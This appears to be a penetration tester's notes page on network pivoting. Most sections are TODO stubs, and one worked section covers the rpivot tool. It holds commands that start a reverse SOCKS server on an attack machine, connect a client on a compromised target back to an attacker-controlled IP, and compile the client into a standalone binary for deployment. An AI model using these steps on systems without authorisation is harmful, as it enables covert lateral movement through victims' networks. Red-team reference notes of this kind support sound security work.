# Network

This page has tips and snippets for basic network navigation and exploitation.

## ARP Spoofing

TODO

## Proxying Around

### Port Forwarding

TODO: normal ssh portforwards

### SOCKS Proxying

TODO

### UDP Redirection

TODO: https://blog.cobaltstrike.com/2021/03/11/simple-dns-redirectors-for-cobalt-strike/

### Reverse SOCKS Proxying

TODO: OpenSSH 7.6+ `ssh -R`

Sometimes you end up on a box without credentials or any other of "forward" dynamic-proxying through it (through traditional `ssh -D` methods). In these cases, the [rpivot](https://github.com/klsecservices/rpivot) project is insanely useful. Think of it like a "reverse" `ssh -D`.

It uses a client-server architecture, and only supports Python 2.6/2.7. On your attack machine, download and run the server:

```sh
# Download and package both the client and server into a zip file; allows for easier deployment.
cd /opt && git clone https://github.com/klsecservices/rpivot && cd rpivot
zip rpivot.zip -r *.py ./ntlm_auth/

# Run the server on your attack machine.
python rpivot.zip server --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 9050
```

Then transfer the built `rpivot.zip` file to the target and connect the client back to the server:

```sh
# Connect back to attacker-controlled server at 10.10.10.10.
python rpivot.zip client --server-ip 10.10.10.10 --server-port 9999
```

You should now be able to use `proxychains` (or another SOCKS4 proxy client) to tunnel through the machine where you ran the client.

If you need to deploy the `rpivot` client to a target without Python, compile it into a standalone binary with [PyInstaller](https://www.pyinstaller.org/):

```sh
cd /opt/rpivot
pyinstaller -F client.py
file dist/client
```

The same can be done with the server, if necessary.
